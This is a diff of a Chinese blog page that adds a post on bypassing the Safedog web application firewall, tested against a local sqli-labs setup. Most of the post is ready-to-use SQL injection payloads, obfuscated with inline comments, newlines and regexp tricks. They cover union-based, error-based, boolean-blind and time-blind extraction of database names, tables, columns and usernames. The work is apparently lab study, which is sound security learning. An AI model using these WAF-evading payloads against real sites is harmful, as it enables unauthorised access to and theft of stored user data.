@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Category: pentest | popko&#39;s Blog</title>
+  <title itemprop="name">waf绕过 | popko&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -164,171 +164,197 @@
   </div>
 </header>
 
-      
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
 <div class="pattern-center-blank"></div>
-<div class="pattern-center ">
-  <div class="pattern-attachment-img">
-    <img data-src="pentest.img" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      waf绕过</h1>
+      <p class="entry-census">
+        <span>
+          <a href="popko.top">
+            <img src="https://www.popko.top/img/custom/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="popko.top">popko</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2022-4-5<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
   </div>
-  <header class="pattern-header ">
-    <h1 class="cat-title">pentest.zh</h1>
-    <span class="cat-des">
-      <p>pentest.en</p>
-    </span>
-  </header>
-</div>
+
 <div id="content" class="site-content">
   <div id="primary" class="content-area">
     <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><h2 id="安全狗"><a href="#安全狗" class="headerlink" title="安全狗"></a>安全狗</h2><p><a target="_blank" rel="noopener" href="http://down.safedog.cn/download/software/safedogwz_Windows_Help.pdf">http://down.safedog.cn/download/software/safedogwz_Windows_Help.pdf</a></p>
+<p>找不到apache服务名，插件安装失败</p>
+<p><a target="_blank" rel="noopener" href="https://wxiaoge.blog.csdn.net/article/details/103912900?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=2">https://wxiaoge.blog.csdn.net/article/details/103912900?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=2</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48776804/article/details/113807682">https://blog.csdn.net/weixin_48776804/article/details/113807682</a></p>
+<p><img src="https://raw.githubusercontent.com/pipimi110/blogimg_v1/master/img/image-20220405173529287.png" alt="image-20220405173529287"></p>
+<p>管理员cmd</p>
+<pre><code>cd C:\tool\phpstudy\Apache\bin
+</code></pre><pre><code>安装服务
+httpd.exe -k install -n apache2.4
+卸载服务
+httpd.exe -k uninstall -n apache2.4
+sc delete apache2.4
+</code></pre><p>win+r</p>
+<p>services.msc//启动对应服务</p>
+<p>安全狗需要使用新版本的phpstudy//而且需要卸载安全狗重装，才能安装插件成功</p>
+<h3 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h3><p><strong>报错</strong> </p>
+<blockquote>
+<p>Illegal mix of collations for operation ‘UNION’</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mengmeng2222222/article/details/97912270">https://blog.csdn.net/mengmeng2222222/article/details/97912270</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u013419759/article/details/82184713?spm=1001.2101.3001.6650.6&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default">https://blog.csdn.net/u013419759/article/details/82184713?spm=1001.2101.3001.6650.6&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7ERate-6.pc_relevant_default</a></p>
+</blockquote>
+<pre><code>show create table users;
+</code></pre><blockquote>
+<p>DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci</p>
+</blockquote>
+<pre><code>alter table users convert to character set utf8;
+</code></pre><blockquote>
+<p>DEFAULT CHARSET=utf8</p>
+</blockquote>
+<h4 id="union注入"><a href="#union注入" class="headerlink" title="union注入"></a>union注入</h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/263744">https://www.anquanke.com/post/id/263744</a></p>
+<pre><code>http://localhost/sqli-labs-master/Less-1/?id=1%27%20and%201=1--+
+</code></pre><p>绕过 <code>1&#39; and 1--+</code></p>
+<pre><code>1&#39; and ord(0x1)--+
+1&#39; and ord(0x0)--+
+</code></pre><p>绕过 order by</p>
+<pre><code>1 &#39;order/*/*/by+4--+
+</code></pre><p>绕过 union select //</p>
+<pre><code>1%27regexp+&quot;%23&quot;+union+%0A+select+1,2,3--+
+1%27regexp+&quot;%23&quot;+union+%0A+select+1,database(/*!1*/),3--+
+库
+1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(schema_name)from/*!/*%23*/%0Ainformation_schema.schemata*/),3--+
+表
+1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(table_name)from/*!/*%23*/%0Ainformation_schema.tables+where+table_schema=database()*/),3--+
+列
+1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),3--+
+数据
+1%27regexp+&quot;%23&quot;+union+%0A+select+1,group_concat(username/*1*/),3+from+users--+
+1%27regexp+&quot;%23&quot;+union+%0A+select+1,(select+group_concat(username)from+users),3--+
+</code></pre><h4 id="报错"><a href="#报错" class="headerlink" title="报错"></a>报错</h4><p>过滤updatexml(1,1,1)</p>
+<pre><code>1&#39;regexp+&quot;%23&quot;and+(updatexml%0a(1,concat(0x7e,(select+&#39;qwe&#39;)),1))--+
+1&#39;regexp+&quot;%23&quot;and+(updatexml%0a(1,concat(0x7e,(select+group_concat(username)from+users)),1))--+
+</code></pre><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>绕过 <code>if(1,1,0)</code></p>
+<pre><code>1&#39;and+(if(1,1,0))--+
+</code></pre><p>过滤 <code>=&#39;a&#39;</code> <code>&gt;&lt;`</code>like`</p>
+<pre><code>1&#39;and+(if(substr(&#39;abc&#39;,1,1)regexp&#39;^a$&#39;,1,0))--+
+</code></pre><p>布尔盲注</p>
+<pre><code>库
+1&#39;and+(if(substr((select+group_concat(schema_name)from/*!/*%23*/%0Ainformation_schema.schemata*/),1,1)regexp&#39;^D$&#39;,1,0))--+
+表
+1&#39;and+(if(substr((select+group_concat(table_name)from/*!/*%23*/%0Ainformation_schema.tables+where+table_schema=database()*/),1,1)regexp&#39;^D$&#39;,1,0))--+
+列
+1&#39;and+(if(substr((select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),1,1)regexp&#39;^D$&#39;,1,0))--+
+数据
+1&#39;and+(if(substr((select+group_concat(username)from+users),1,1)regexp&#39;^D$&#39;,1,0))--+
+</code></pre><p>时间盲注//第六个字符开始有效</p>
+<pre><code> select /*!123456789*/;
++------+
+| 6789 |
++------+
+| 6789 |
++------+
+</code></pre><pre><code>1&#39;and+(if(substr((select+group_concat(column_name)from/*!/*%23*/%0Ainformation_schema.columns+where+table_name=&#39;users&#39;*/),1,1)regexp&#39;^D$&#39;,1,sleep(/*!111113*/)))--+
+</code></pre><h4 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h4><p>编写对应绕过tamper</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10479">https://xz.aliyun.com/t/10479</a></p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="/#"></li>
+                <li class="wechat-code"><img src="/#"></li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2022/04/05/spring-cve/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                spring-cve</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
       
-  <!-- 首页默认取最最新文章集 -->
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/">
-    waf绕过</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2022-4-5</div>
-    <p>
-    </p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/">
-    密码表</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-4-19</div>
-    <p>
-    </p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz",
+        appKey: "mgOpfzbkHYqU92CV4IDlAUHQ",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
 
-
-      <div class="clearer">
-      </div>
-    </main>
-    <!--  -->
-    
-  </div>
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="popko.top" class="profile gravatar"><img src="https://www.popko.top/img/custom/avatar.jpg" itemprop="image" alt="popko" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="popko.top" itemprop="url" rel="author">popko</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i>otaku</p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
 
-<!-- 
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/">
-    waf绕过</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2022-4-5</div>
-    <p>
-    </p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2022/04/05/waf%E7%BB%95%E8%BF%87/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
-    <article class="post post-list" itemscope="" itemtype="https://schema.org/BlogPosting">
-  <div class="post-entry">
-    <div class="feature">
-      <a href="/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/">
-        <div class="overlay">
-          <i class="iconfont icon-text">
-          </i>
-        </div>
-        <img width="150" height="150" src="https://cdn.jsdelivr.net/gh/pipimi110/CDN@1.1/img/bg/bh3/bh3_01.png" class="attachment-post-thumbnail size-post-thumbnail wp-post-image" alt="" >
-      </a>
-    </div>
-    <h1 class="entry-title">
-    <a href="/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/">
-    密码表</a>
-    </h1>
-    <div class="p-time">
-      <i class="iconfont icon-time">
-      </i>
-    2021-4-19</div>
-    <p>
-    </p>
-    <footer class="entry-footer">
-      <div class="post-more">
-        <a href="/2021/04/19/%E5%AF%86%E7%A0%81%E8%A1%A8/">
-          <i class="iconfont icon-caidan">
-          </i>
-        </a>
-      </div>
-    </footer>
-  </div>
-  <hr>
-</article>
-  
 
- -->
+
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
